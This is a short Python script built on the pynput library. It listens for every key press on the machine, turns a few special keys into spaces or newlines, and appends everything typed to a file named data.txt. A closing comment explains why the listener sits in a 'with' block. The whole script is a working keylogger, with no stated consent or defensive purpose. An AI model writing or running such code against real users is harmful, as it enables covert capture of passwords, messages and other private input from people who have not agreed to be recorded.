from pynput.keyboard import Listener


def Data_Input(key):
    Data = str(key)
    Data = Data.replace("'", "")

    if Data == 'Key.space':
        Data = ' '
    if Data == 'Key.shift_r':
        Data = ''
    if Data == "Key.ctrl_l":
        Data = ""
    if Data == "Key.enter":
        Data = "\n"

    with open("data.txt", 'a') as f:
        f.write(Data)

# Collecting events until stopped

with Listener(on_press=Data_Input) as l:
    l.join()


# 'with' will automatically close the listener. When we stop the program the memory allocated
# to this listener won't be released. 'with' makes sure whatever happens, when an error is there
# or the program stops the memory is released. It's just a good coding principle to follow

